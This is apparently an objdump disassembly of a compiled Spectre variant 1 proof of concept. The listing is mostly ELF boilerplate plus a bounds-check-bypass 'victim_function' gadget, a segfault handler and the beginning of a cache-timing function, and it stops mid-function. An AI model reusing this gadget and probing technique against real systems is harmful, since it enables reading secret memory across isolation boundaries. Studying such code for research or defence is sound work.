
spectre1:     file format elf64-x86-64


Disassembly of section .interp:

0000000000000238 <.interp>:
 238:	2f                   	(bad)  
 239:	6c                   	insb   (%dx),%es:(%rdi)
 23a:	69 62 36 34 2f 6c 64 	imul   $0x646c2f34,0x36(%rdx),%esp
 241:	2d 6c 69 6e 75       	sub    $0x756e696c,%eax
 246:	78 2d                	js     275 <_init-0x43b>
 248:	78 38                	js     282 <_init-0x42e>
 24a:	36 2d 36 34 2e 73    	ss sub $0x732e3436,%eax
 250:	6f                   	outsl  %ds:(%rsi),(%dx)
 251:	2e 32 00             	xor    %cs:(%rax),%al

Disassembly of section .note.ABI-tag:

0000000000000254 <.note.ABI-tag>:
 254:	04 00                	add    $0x0,%al
 256:	00 00                	add    %al,(%rax)
 258:	10 00                	adc    %al,(%rax)
 25a:	00 00                	add    %al,(%rax)
 25c:	01 00                	add    %eax,(%rax)
 25e:	00 00                	add    %al,(%rax)
 260:	47                   	rex.RXB
 261:	4e 55                	rex.WRX push %rbp
 263:	00 00                	add    %al,(%rax)
 265:	00 00                	add    %al,(%rax)
 267:	00 03                	add    %al,(%rbx)
 269:	00 00                	add    %al,(%rax)
 26b:	00 02                	add    %al,(%rdx)
 26d:	00 00                	add    %al,(%rax)
 26f:	00 00                	add    %al,(%rax)
 271:	00 00                	add    %al,(%rax)
	...

Disassembly of section .note.gnu.build-id:

0000000000000274 <.note.gnu.build-id>:
 274:	04 00                	add    $0x0,%al
 276:	00 00                	add    %al,(%rax)
 278:	14 00                	adc    $0x0,%al
 27a:	00 00                	add    %al,(%rax)
 27c:	03 00                	add    (%rax),%eax
 27e:	00 00                	add    %al,(%rax)
 280:	47                   	rex.RXB
 281:	4e 55                	rex.WRX push %rbp
 283:	00 55 66             	add    %dl,0x66(%rbp)
 286:	4e                   	rex.WRX
 287:	48 29 f2             	sub    %rsi,%rdx
 28a:	58                   	pop    %rax
 28b:	29 04 e5 da d9 e7 42 	sub    %eax,0x42e7d9da(,%riz,8)
 292:	b6 cb                	mov    $0xcb,%dh
 294:	51                   	push   %rcx
 295:	99                   	cltd   
 296:	9d                   	popfq  
 297:	ba                   	.byte 0xba

Disassembly of section .gnu.hash:

0000000000000298 <.gnu.hash>:
 298:	01 00                	add    %eax,(%rax)
 29a:	00 00                	add    %al,(%rax)
 29c:	01 00                	add    %eax,(%rax)
 29e:	00 00                	add    %al,(%rax)
 2a0:	01 00                	add    %eax,(%rax)
	...

Disassembly of section .dynsym:

00000000000002b8 <.dynsym>:
	...
 2d0:	0b 00                	or     (%rax),%eax
 2d2:	00 00                	add    %al,(%rax)
 2d4:	12 00                	adc    (%rax),%al
	...
 2e6:	00 00                	add    %al,(%rax)
 2e8:	75 00                	jne    2ea <_init-0x3c6>
 2ea:	00 00                	add    %al,(%rax)
 2ec:	12 00                	adc    (%rax),%al
	...
 2fe:	00 00                	add    %al,(%rax)
 300:	90                   	nop
 301:	00 00                	add    %al,(%rax)
 303:	00 20                	add    %ah,(%rax)
	...
 315:	00 00                	add    %al,(%rax)
 317:	00 17                	add    %dl,(%rdi)
 319:	00 00                	add    %al,(%rax)
 31b:	00 12                	add    %dl,(%rdx)
	...
 32d:	00 00                	add    %al,(%rax)
 32f:	00 28                	add    %ch,(%rax)
 331:	00 00                	add    %al,(%rax)
 333:	00 12                	add    %dl,(%rdx)
	...
 345:	00 00                	add    %al,(%rax)
 347:	00 63 00             	add    %ah,0x0(%rbx)
 34a:	00 00                	add    %al,(%rax)
 34c:	12 00                	adc    (%rax),%al
	...
 35e:	00 00                	add    %al,(%rax)
 360:	2f                   	(bad)  
 361:	00 00                	add    %al,(%rax)
 363:	00 12                	add    %dl,(%rdx)
	...
 375:	00 00                	add    %al,(%rax)
 377:	00 ac 00 00 00 20 00 	add    %ch,0x200000(%rax,%rax,1)
	...
 38e:	00 00                	add    %al,(%rax)
 390:	4d 00 00             	rex.WRB add %r8b,(%r8)
 393:	00 12                	add    %dl,(%rdx)
	...
 3a5:	00 00                	add    %al,(%rax)
 3a7:	00 3b                	add    %bh,(%rbx)
 3a9:	00 00                	add    %al,(%rax)
 3ab:	00 12                	add    %dl,(%rdx)
	...
 3bd:	00 00                	add    %al,(%rax)
 3bf:	00 bb 00 00 00 20    	add    %bh,0x20000000(%rbx)
	...
 3d5:	00 00                	add    %al,(%rax)
 3d7:	00 54 00 00          	add    %dl,0x0(%rax,%rax,1)
 3db:	00 22                	add    %ah,(%rdx)
	...
 3ed:	00 00                	add    %al,(%rax)
 3ef:	00 43 00             	add    %al,0x0(%rbx)
 3f2:	00 00                	add    %al,(%rax)
 3f4:	12 00                	adc    (%rax),%al
	...

Disassembly of section .dynstr:

0000000000000408 <.dynstr>:
 408:	00 6c 69 62          	add    %ch,0x62(%rcx,%rbp,2)
 40c:	63 2e                	movslq (%rsi),%ebp
 40e:	73 6f                	jae    47f <_init-0x231>
 410:	2e 36 00 73 69       	cs add %dh,%ss:0x69(%rbx)
 415:	67 70 72             	addr32 jo 48a <_init-0x226>
 418:	6f                   	outsl  %ds:(%rsi),(%dx)
 419:	63 6d 61             	movslq 0x61(%rbp),%ebp
 41c:	73 6b                	jae    489 <_init-0x227>
 41e:	00 5f 5f             	add    %bl,0x5f(%rdi)
 421:	73 74                	jae    497 <_init-0x219>
 423:	61                   	(bad)  
 424:	63 6b 5f             	movslq 0x5f(%rbx),%ebp
 427:	63 68 6b             	movslq 0x6b(%rax),%ebp
 42a:	5f                   	pop    %rdi
 42b:	66 61                	data16 (bad) 
 42d:	69 6c 00 70 72 69 6e 	imul   $0x746e6972,0x70(%rax,%rax,1),%ebp
 434:	74 
 435:	66 00 73 69          	data16 add %dh,0x69(%rbx)
 439:	67 65 6d             	gs insl (%dx),%es:(%edi)
 43c:	70 74                	jo     4b2 <_init-0x1fe>
 43e:	79 73                	jns    4b3 <_init-0x1fd>
 440:	65 74 00             	gs je  443 <_init-0x26d>
 443:	6c                   	insb   (%dx),%es:(%rdi)
 444:	6f                   	outsl  %ds:(%rsi),(%dx)
 445:	6e                   	outsb  %ds:(%rsi),(%dx)
 446:	67 6a 6d             	addr32 pushq $0x6d
 449:	70 00                	jo     44b <_init-0x265>
 44b:	73 69                	jae    4b6 <_init-0x1fa>
 44d:	67 61                	addr32 (bad) 
 44f:	64 64 73 65          	fs fs jae 4b8 <_init-0x1f8>
 453:	74 00                	je     455 <_init-0x25b>
 455:	6d                   	insl   (%dx),%es:(%rdi)
 456:	61                   	(bad)  
 457:	6c                   	insb   (%dx),%es:(%rdi)
 458:	6c                   	insb   (%dx),%es:(%rdi)
 459:	6f                   	outsl  %ds:(%rsi),(%dx)
 45a:	63 00                	movslq (%rax),%eax
 45c:	5f                   	pop    %rdi
 45d:	5f                   	pop    %rdi
 45e:	63 78 61             	movslq 0x61(%rax),%edi
 461:	5f                   	pop    %rdi
 462:	66 69 6e 61 6c 69    	imul   $0x696c,0x61(%rsi),%bp
 468:	7a 65                	jp     4cf <_init-0x1e1>
 46a:	00 5f 5f             	add    %bl,0x5f(%rdi)
 46d:	6c                   	insb   (%dx),%es:(%rdi)
 46e:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%rdx),%esp
 475:	72 74                	jb     4eb <_init-0x1c5>
 477:	5f                   	pop    %rdi
 478:	6d                   	insl   (%dx),%es:(%rdi)
 479:	61                   	(bad)  
 47a:	69 6e 00 66 72 65 65 	imul   $0x65657266,0x0(%rsi),%ebp
 481:	00 47 4c             	add    %al,0x4c(%rdi)
 484:	49                   	rex.WB
 485:	42                   	rex.X
 486:	43 5f                	rex.XB pop %r15
 488:	32 2e                	xor    (%rsi),%ch
 48a:	34 00                	xor    $0x0,%al
 48c:	47                   	rex.RXB
 48d:	4c                   	rex.WR
 48e:	49                   	rex.WB
 48f:	42                   	rex.X
 490:	43 5f                	rex.XB pop %r15
 492:	32 2e                	xor    (%rsi),%ch
 494:	32 2e                	xor    (%rsi),%ch
 496:	35 00 5f 49 54       	xor    $0x54495f00,%eax
 49b:	4d 5f                	rex.WRB pop %r15
 49d:	64 65 72 65          	fs gs jb 506 <_init-0x1aa>
 4a1:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
 4a8:	4d 
 4a9:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
 4ab:	6f                   	outsl  %ds:(%rsi),(%dx)
 4ac:	6e                   	outsb  %ds:(%rsi),(%dx)
 4ad:	65 54                	gs push %rsp
 4af:	61                   	(bad)  
 4b0:	62                   	(bad)  
 4b1:	6c                   	insb   (%dx),%es:(%rdi)
 4b2:	65 00 5f 5f          	add    %bl,%gs:0x5f(%rdi)
 4b6:	67 6d                	insl   (%dx),%es:(%edi)
 4b8:	6f                   	outsl  %ds:(%rsi),(%dx)
 4b9:	6e                   	outsb  %ds:(%rsi),(%dx)
 4ba:	5f                   	pop    %rdi
 4bb:	73 74                	jae    531 <_init-0x17f>
 4bd:	61                   	(bad)  
 4be:	72 74                	jb     534 <_init-0x17c>
 4c0:	5f                   	pop    %rdi
 4c1:	5f                   	pop    %rdi
 4c2:	00 5f 49             	add    %bl,0x49(%rdi)
 4c5:	54                   	push   %rsp
 4c6:	4d 5f                	rex.WRB pop %r15
 4c8:	72 65                	jb     52f <_init-0x181>
 4ca:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
 4d1:	4d 
 4d2:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
 4d4:	6f                   	outsl  %ds:(%rsi),(%dx)
 4d5:	6e                   	outsb  %ds:(%rsi),(%dx)
 4d6:	65 54                	gs push %rsp
 4d8:	61                   	(bad)  
 4d9:	62                   	.byte 0x62
 4da:	6c                   	insb   (%dx),%es:(%rdi)
 4db:	65                   	gs
	...

Disassembly of section .gnu.version:

00000000000004de <.gnu.version>:
 4de:	00 00                	add    %al,(%rax)
 4e0:	02 00                	add    (%rax),%al
 4e2:	02 00                	add    (%rax),%al
 4e4:	00 00                	add    %al,(%rax)
 4e6:	03 00                	add    (%rax),%eax
 4e8:	02 00                	add    (%rax),%al
 4ea:	02 00                	add    (%rax),%al
 4ec:	02 00                	add    (%rax),%al
 4ee:	00 00                	add    %al,(%rax)
 4f0:	02 00                	add    (%rax),%al
 4f2:	02 00                	add    (%rax),%al
 4f4:	00 00                	add    %al,(%rax)
 4f6:	02 00                	add    (%rax),%al
 4f8:	02 00                	add    (%rax),%al

Disassembly of section .gnu.version_r:

0000000000000500 <.gnu.version_r>:
 500:	01 00                	add    %eax,(%rax)
 502:	02 00                	add    (%rax),%al
 504:	01 00                	add    %eax,(%rax)
 506:	00 00                	add    %al,(%rax)
 508:	10 00                	adc    %al,(%rax)
 50a:	00 00                	add    %al,(%rax)
 50c:	00 00                	add    %al,(%rax)
 50e:	00 00                	add    %al,(%rax)
 510:	14 69                	adc    $0x69,%al
 512:	69 0d 00 00 03 00 7a 	imul   $0x7a,0x30000(%rip),%ecx        # 3051c <__FRAME_END__+0x2f510>
 519:	00 00 00 
 51c:	10 00                	adc    %al,(%rax)
 51e:	00 00                	add    %al,(%rax)
 520:	75 1a                	jne    53c <_init-0x174>
 522:	69 09 00 00 02 00    	imul   $0x20000,(%rcx),%ecx
 528:	84 00                	test   %al,(%rax)
 52a:	00 00                	add    %al,(%rax)
 52c:	00 00                	add    %al,(%rax)
	...

Disassembly of section .rela.dyn:

0000000000000530 <.rela.dyn>:
 530:	80 1d 20 00 00 00 00 	sbbb   $0x0,0x20(%rip)        # 557 <_init-0x159>
 537:	00 08                	add    %cl,(%rax)
 539:	00 00                	add    %al,(%rax)
 53b:	00 00                	add    %al,(%rax)
 53d:	00 00                	add    %al,(%rax)
 53f:	00 70 08             	add    %dh,0x8(%rax)
 542:	00 00                	add    %al,(%rax)
 544:	00 00                	add    %al,(%rax)
 546:	00 00                	add    %al,(%rax)
 548:	88 1d 20 00 00 00    	mov    %bl,0x20(%rip)        # 56e <_init-0x142>
 54e:	00 00                	add    %al,(%rax)
 550:	08 00                	or     %al,(%rax)
 552:	00 00                	add    %al,(%rax)
 554:	00 00                	add    %al,(%rax)
 556:	00 00                	add    %al,(%rax)
 558:	30 08                	xor    %cl,(%rax)
 55a:	00 00                	add    %al,(%rax)
 55c:	00 00                	add    %al,(%rax)
 55e:	00 00                	add    %al,(%rax)
 560:	08 20                	or     %ah,(%rax)
 562:	20 00                	and    %al,(%rax)
 564:	00 00                	add    %al,(%rax)
 566:	00 00                	add    %al,(%rax)
 568:	08 00                	or     %al,(%rax)
 56a:	00 00                	add    %al,(%rax)
 56c:	00 00                	add    %al,(%rax)
 56e:	00 00                	add    %al,(%rax)
 570:	08 20                	or     %ah,(%rax)
 572:	20 00                	and    %al,(%rax)
 574:	00 00                	add    %al,(%rax)
 576:	00 00                	add    %al,(%rax)
 578:	d8 1f                	fcomps (%rdi)
 57a:	20 00                	and    %al,(%rax)
 57c:	00 00                	add    %al,(%rax)
 57e:	00 00                	add    %al,(%rax)
 580:	06                   	(bad)  
 581:	00 00                	add    %al,(%rax)
 583:	00 03                	add    %al,(%rbx)
	...
 58d:	00 00                	add    %al,(%rax)
 58f:	00 e0                	add    %ah,%al
 591:	1f                   	(bad)  
 592:	20 00                	and    %al,(%rax)
 594:	00 00                	add    %al,(%rax)
 596:	00 00                	add    %al,(%rax)
 598:	06                   	(bad)  
 599:	00 00                	add    %al,(%rax)
 59b:	00 06                	add    %al,(%rsi)
	...
 5a5:	00 00                	add    %al,(%rax)
 5a7:	00 e8                	add    %ch,%al
 5a9:	1f                   	(bad)  
 5aa:	20 00                	and    %al,(%rax)
 5ac:	00 00                	add    %al,(%rax)
 5ae:	00 00                	add    %al,(%rax)
 5b0:	06                   	(bad)  
 5b1:	00 00                	add    %al,(%rax)
 5b3:	00 08                	add    %cl,(%rax)
	...
 5bd:	00 00                	add    %al,(%rax)
 5bf:	00 f0                	add    %dh,%al
 5c1:	1f                   	(bad)  
 5c2:	20 00                	and    %al,(%rax)
 5c4:	00 00                	add    %al,(%rax)
 5c6:	00 00                	add    %al,(%rax)
 5c8:	06                   	(bad)  
 5c9:	00 00                	add    %al,(%rax)
 5cb:	00 0b                	add    %cl,(%rbx)
	...
 5d5:	00 00                	add    %al,(%rax)
 5d7:	00 f8                	add    %bh,%al
 5d9:	1f                   	(bad)  
 5da:	20 00                	and    %al,(%rax)
 5dc:	00 00                	add    %al,(%rax)
 5de:	00 00                	add    %al,(%rax)
 5e0:	06                   	(bad)  
 5e1:	00 00                	add    %al,(%rax)
 5e3:	00 0c 00             	add    %cl,(%rax,%rax,1)
	...

Disassembly of section .rela.plt:

00000000000005f0 <.rela.plt>:
 5f0:	98                   	cwtl   
 5f1:	1f                   	(bad)  
 5f2:	20 00                	and    %al,(%rax)
 5f4:	00 00                	add    %al,(%rax)
 5f6:	00 00                	add    %al,(%rax)
 5f8:	07                   	(bad)  
 5f9:	00 00                	add    %al,(%rax)
 5fb:	00 01                	add    %al,(%rcx)
	...
 605:	00 00                	add    %al,(%rax)
 607:	00 a0 1f 20 00 00    	add    %ah,0x201f(%rax)
 60d:	00 00                	add    %al,(%rax)
 60f:	00 07                	add    %al,(%rdi)
 611:	00 00                	add    %al,(%rax)
 613:	00 02                	add    %al,(%rdx)
	...
 61d:	00 00                	add    %al,(%rax)
 61f:	00 a8 1f 20 00 00    	add    %ch,0x201f(%rax)
 625:	00 00                	add    %al,(%rax)
 627:	00 07                	add    %al,(%rdi)
 629:	00 00                	add    %al,(%rax)
 62b:	00 04 00             	add    %al,(%rax,%rax,1)
	...
 636:	00 00                	add    %al,(%rax)
 638:	b0 1f                	mov    $0x1f,%al
 63a:	20 00                	and    %al,(%rax)
 63c:	00 00                	add    %al,(%rax)
 63e:	00 00                	add    %al,(%rax)
 640:	07                   	(bad)  
 641:	00 00                	add    %al,(%rax)
 643:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 649 <_init-0x67>
 649:	00 00                	add    %al,(%rax)
 64b:	00 00                	add    %al,(%rax)
 64d:	00 00                	add    %al,(%rax)
 64f:	00 b8 1f 20 00 00    	add    %bh,0x201f(%rax)
 655:	00 00                	add    %al,(%rax)
 657:	00 07                	add    %al,(%rdi)
 659:	00 00                	add    %al,(%rax)
 65b:	00 07                	add    %al,(%rdi)
	...
 665:	00 00                	add    %al,(%rax)
 667:	00 c0                	add    %al,%al
 669:	1f                   	(bad)  
 66a:	20 00                	and    %al,(%rax)
 66c:	00 00                	add    %al,(%rax)
 66e:	00 00                	add    %al,(%rax)
 670:	07                   	(bad)  
 671:	00 00                	add    %al,(%rax)
 673:	00 09                	add    %cl,(%rcx)
	...
 67d:	00 00                	add    %al,(%rax)
 67f:	00 c8                	add    %cl,%al
 681:	1f                   	(bad)  
 682:	20 00                	and    %al,(%rax)
 684:	00 00                	add    %al,(%rax)
 686:	00 00                	add    %al,(%rax)
 688:	07                   	(bad)  
 689:	00 00                	add    %al,(%rax)
 68b:	00 0a                	add    %cl,(%rdx)
	...
 695:	00 00                	add    %al,(%rax)
 697:	00 d0                	add    %dl,%al
 699:	1f                   	(bad)  
 69a:	20 00                	and    %al,(%rax)
 69c:	00 00                	add    %al,(%rax)
 69e:	00 00                	add    %al,(%rax)
 6a0:	07                   	(bad)  
 6a1:	00 00                	add    %al,(%rax)
 6a3:	00 0d 00 00 00 00    	add    %cl,0x0(%rip)        # 6a9 <_init-0x7>
 6a9:	00 00                	add    %al,(%rax)
 6ab:	00 00                	add    %al,(%rax)
 6ad:	00 00                	add    %al,(%rax)
	...

Disassembly of section .init:

00000000000006b0 <_init>:
 6b0:	48 83 ec 08          	sub    $0x8,%rsp
 6b4:	48 8b 05 2d 19 20 00 	mov    0x20192d(%rip),%rax        # 201fe8 <__gmon_start__>
 6bb:	48 85 c0             	test   %rax,%rax
 6be:	74 02                	je     6c2 <_init+0x12>
 6c0:	ff d0                	callq  *%rax
 6c2:	48 83 c4 08          	add    $0x8,%rsp
 6c6:	c3                   	retq   

Disassembly of section .plt:

00000000000006d0 <.plt>:
 6d0:	ff 35 b2 18 20 00    	pushq  0x2018b2(%rip)        # 201f88 <_GLOBAL_OFFSET_TABLE_+0x8>
 6d6:	ff 25 b4 18 20 00    	jmpq   *0x2018b4(%rip)        # 201f90 <_GLOBAL_OFFSET_TABLE_+0x10>
 6dc:	0f 1f 40 00          	nopl   0x0(%rax)

00000000000006e0 <sigprocmask@plt>:
 6e0:	ff 25 b2 18 20 00    	jmpq   *0x2018b2(%rip)        # 201f98 <sigprocmask@GLIBC_2.2.5>
 6e6:	68 00 00 00 00       	pushq  $0x0
 6eb:	e9 e0 ff ff ff       	jmpq   6d0 <.plt>

00000000000006f0 <free@plt>:
 6f0:	ff 25 aa 18 20 00    	jmpq   *0x2018aa(%rip)        # 201fa0 <free@GLIBC_2.2.5>
 6f6:	68 01 00 00 00       	pushq  $0x1
 6fb:	e9 d0 ff ff ff       	jmpq   6d0 <.plt>

0000000000000700 <__stack_chk_fail@plt>:
 700:	ff 25 a2 18 20 00    	jmpq   *0x2018a2(%rip)        # 201fa8 <__stack_chk_fail@GLIBC_2.4>
 706:	68 02 00 00 00       	pushq  $0x2
 70b:	e9 c0 ff ff ff       	jmpq   6d0 <.plt>

0000000000000710 <printf@plt>:
 710:	ff 25 9a 18 20 00    	jmpq   *0x20189a(%rip)        # 201fb0 <printf@GLIBC_2.2.5>
 716:	68 03 00 00 00       	pushq  $0x3
 71b:	e9 b0 ff ff ff       	jmpq   6d0 <.plt>

0000000000000720 <sigemptyset@plt>:
 720:	ff 25 92 18 20 00    	jmpq   *0x201892(%rip)        # 201fb8 <sigemptyset@GLIBC_2.2.5>
 726:	68 04 00 00 00       	pushq  $0x4
 72b:	e9 a0 ff ff ff       	jmpq   6d0 <.plt>

0000000000000730 <malloc@plt>:
 730:	ff 25 8a 18 20 00    	jmpq   *0x20188a(%rip)        # 201fc0 <malloc@GLIBC_2.2.5>
 736:	68 05 00 00 00       	pushq  $0x5
 73b:	e9 90 ff ff ff       	jmpq   6d0 <.plt>

0000000000000740 <longjmp@plt>:
 740:	ff 25 82 18 20 00    	jmpq   *0x201882(%rip)        # 201fc8 <longjmp@GLIBC_2.2.5>
 746:	68 06 00 00 00       	pushq  $0x6
 74b:	e9 80 ff ff ff       	jmpq   6d0 <.plt>

0000000000000750 <sigaddset@plt>:
 750:	ff 25 7a 18 20 00    	jmpq   *0x20187a(%rip)        # 201fd0 <sigaddset@GLIBC_2.2.5>
 756:	68 07 00 00 00       	pushq  $0x7
 75b:	e9 70 ff ff ff       	jmpq   6d0 <.plt>

Disassembly of section .plt.got:

0000000000000760 <__cxa_finalize@plt>:
 760:	ff 25 92 18 20 00    	jmpq   *0x201892(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 766:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

0000000000000770 <_start>:
 770:	31 ed                	xor    %ebp,%ebp
 772:	49 89 d1             	mov    %rdx,%r9
 775:	5e                   	pop    %rsi
 776:	48 89 e2             	mov    %rsp,%rdx
 779:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
 77d:	50                   	push   %rax
 77e:	54                   	push   %rsp
 77f:	4c 8d 05 ea 05 00 00 	lea    0x5ea(%rip),%r8        # d70 <__libc_csu_fini>
 786:	48 8d 0d 73 05 00 00 	lea    0x573(%rip),%rcx        # d00 <__libc_csu_init>
 78d:	48 8d 3d 58 04 00 00 	lea    0x458(%rip),%rdi        # bec <main>
 794:	ff 15 46 18 20 00    	callq  *0x201846(%rip)        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
 79a:	f4                   	hlt    
 79b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000000007a0 <deregister_tm_clones>:
 7a0:	48 8d 3d 69 19 20 00 	lea    0x201969(%rip),%rdi        # 202110 <__TMC_END__>
 7a7:	55                   	push   %rbp
 7a8:	48 8d 05 61 19 20 00 	lea    0x201961(%rip),%rax        # 202110 <__TMC_END__>
 7af:	48 39 f8             	cmp    %rdi,%rax
 7b2:	48 89 e5             	mov    %rsp,%rbp
 7b5:	74 19                	je     7d0 <deregister_tm_clones+0x30>
 7b7:	48 8b 05 1a 18 20 00 	mov    0x20181a(%rip),%rax        # 201fd8 <_ITM_deregisterTMCloneTable>
 7be:	48 85 c0             	test   %rax,%rax
 7c1:	74 0d                	je     7d0 <deregister_tm_clones+0x30>
 7c3:	5d                   	pop    %rbp
 7c4:	ff e0                	jmpq   *%rax
 7c6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 7cd:	00 00 00 
 7d0:	5d                   	pop    %rbp
 7d1:	c3                   	retq   
 7d2:	0f 1f 40 00          	nopl   0x0(%rax)
 7d6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 7dd:	00 00 00 

00000000000007e0 <register_tm_clones>:
 7e0:	48 8d 3d 29 19 20 00 	lea    0x201929(%rip),%rdi        # 202110 <__TMC_END__>
 7e7:	48 8d 35 22 19 20 00 	lea    0x201922(%rip),%rsi        # 202110 <__TMC_END__>
 7ee:	55                   	push   %rbp
 7ef:	48 29 fe             	sub    %rdi,%rsi
 7f2:	48 89 e5             	mov    %rsp,%rbp
 7f5:	48 c1 fe 03          	sar    $0x3,%rsi
 7f9:	48 89 f0             	mov    %rsi,%rax
 7fc:	48 c1 e8 3f          	shr    $0x3f,%rax
 800:	48 01 c6             	add    %rax,%rsi
 803:	48 d1 fe             	sar    %rsi
 806:	74 18                	je     820 <register_tm_clones+0x40>
 808:	48 8b 05 e1 17 20 00 	mov    0x2017e1(%rip),%rax        # 201ff0 <_ITM_registerTMCloneTable>
 80f:	48 85 c0             	test   %rax,%rax
 812:	74 0c                	je     820 <register_tm_clones+0x40>
 814:	5d                   	pop    %rbp
 815:	ff e0                	jmpq   *%rax
 817:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
 81e:	00 00 
 820:	5d                   	pop    %rbp
 821:	c3                   	retq   
 822:	0f 1f 40 00          	nopl   0x0(%rax)
 826:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 82d:	00 00 00 

0000000000000830 <__do_global_dtors_aux>:
 830:	80 3d e9 18 20 00 00 	cmpb   $0x0,0x2018e9(%rip)        # 202120 <completed.7697>
 837:	75 2f                	jne    868 <__do_global_dtors_aux+0x38>
 839:	48 83 3d b7 17 20 00 	cmpq   $0x0,0x2017b7(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 840:	00 
 841:	55                   	push   %rbp
 842:	48 89 e5             	mov    %rsp,%rbp
 845:	74 0c                	je     853 <__do_global_dtors_aux+0x23>
 847:	48 8b 3d ba 17 20 00 	mov    0x2017ba(%rip),%rdi        # 202008 <__dso_handle>
 84e:	e8 0d ff ff ff       	callq  760 <__cxa_finalize@plt>
 853:	e8 48 ff ff ff       	callq  7a0 <deregister_tm_clones>
 858:	c6 05 c1 18 20 00 01 	movb   $0x1,0x2018c1(%rip)        # 202120 <completed.7697>
 85f:	5d                   	pop    %rbp
 860:	c3                   	retq   
 861:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
 868:	f3 c3                	repz retq 
 86a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000000870 <frame_dummy>:
 870:	55                   	push   %rbp
 871:	48 89 e5             	mov    %rsp,%rbp
 874:	5d                   	pop    %rbp
 875:	e9 66 ff ff ff       	jmpq   7e0 <register_tm_clones>

000000000000087a <victim_function>:
 87a:	55                   	push   %rbp
 87b:	48 89 e5             	mov    %rsp,%rbp
 87e:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
 882:	8b 05 98 17 20 00    	mov    0x201798(%rip),%eax        # 202020 <bufferSize>
 888:	48 98                	cltq   
 88a:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
 88e:	73 34                	jae    8c4 <victim_function+0x4a>
 890:	48 8d 15 a9 17 20 00 	lea    0x2017a9(%rip),%rdx        # 202040 <buffer>
 897:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 89b:	48 01 d0             	add    %rdx,%rax
 89e:	0f b6 00             	movzbl (%rax),%eax
 8a1:	0f b6 c0             	movzbl %al,%eax
 8a4:	c1 e0 0c             	shl    $0xc,%eax
 8a7:	48 63 d0             	movslq %eax,%rdx
 8aa:	48 8d 05 8f 19 20 00 	lea    0x20198f(%rip),%rax        # 202240 <array>
 8b1:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
 8b5:	0f b6 05 88 18 20 00 	movzbl 0x201888(%rip),%eax        # 202144 <temp>
 8bc:	21 d0                	and    %edx,%eax
 8be:	88 05 80 18 20 00    	mov    %al,0x201880(%rip)        # 202144 <temp>
 8c4:	90                   	nop
 8c5:	5d                   	pop    %rbp
 8c6:	c3                   	retq   

00000000000008c7 <unblock_signal>:
 8c7:	55                   	push   %rbp
 8c8:	48 89 e5             	mov    %rsp,%rbp
 8cb:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
 8d2:	89 bd 6c ff ff ff    	mov    %edi,-0x94(%rbp)
 8d8:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
 8df:	00 00 
 8e1:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 8e5:	31 c0                	xor    %eax,%eax
 8e7:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 8ee:	48 89 c7             	mov    %rax,%rdi
 8f1:	e8 2a fe ff ff       	callq  720 <sigemptyset@plt>
 8f6:	8b 95 6c ff ff ff    	mov    -0x94(%rbp),%edx
 8fc:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 903:	89 d6                	mov    %edx,%esi
 905:	48 89 c7             	mov    %rax,%rdi
 908:	e8 43 fe ff ff       	callq  750 <sigaddset@plt>
 90d:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 914:	ba 00 00 00 00       	mov    $0x0,%edx
 919:	48 89 c6             	mov    %rax,%rsi
 91c:	bf 01 00 00 00       	mov    $0x1,%edi
 921:	e8 ba fd ff ff       	callq  6e0 <sigprocmask@plt>
 926:	90                   	nop
 927:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 92b:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
 932:	00 00 
 934:	74 05                	je     93b <unblock_signal+0x74>
 936:	e8 c5 fd ff ff       	callq  700 <__stack_chk_fail@plt>
 93b:	c9                   	leaveq 
 93c:	c3                   	retq   

000000000000093d <trycatch_segfault_handler>:
 93d:	55                   	push   %rbp
 93e:	48 89 e5             	mov    %rsp,%rbp
 941:	48 83 ec 10          	sub    $0x10,%rsp
 945:	89 7d fc             	mov    %edi,-0x4(%rbp)
 948:	bf 0b 00 00 00       	mov    $0xb,%edi
 94d:	e8 75 ff ff ff       	callq  8c7 <unblock_signal>
 952:	bf 08 00 00 00       	mov    $0x8,%edi
 957:	e8 6b ff ff ff       	callq  8c7 <unblock_signal>
 95c:	be 01 00 00 00       	mov    $0x1,%esi
 961:	48 8d 3d f8 17 20 00 	lea    0x2017f8(%rip),%rdi        # 202160 <trycatch_buf>
 968:	e8 d3 fd ff ff       	callq  740 <longjmp@plt>

000000000000096d <find_cached_index>:
 96d:	55                   	push   %rbp
 96e:	48 89 e5             	mov    %rsp,%rbp
 971:	53                   	push   %rbx
 972:	48 89 7d d0          	mov    %rdi,-0x30(%rbp)
 976:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 97d:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 984:	eb 7b                	jmp    a01 <find_cached_index+0x94>
 986:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
 98d:	00 
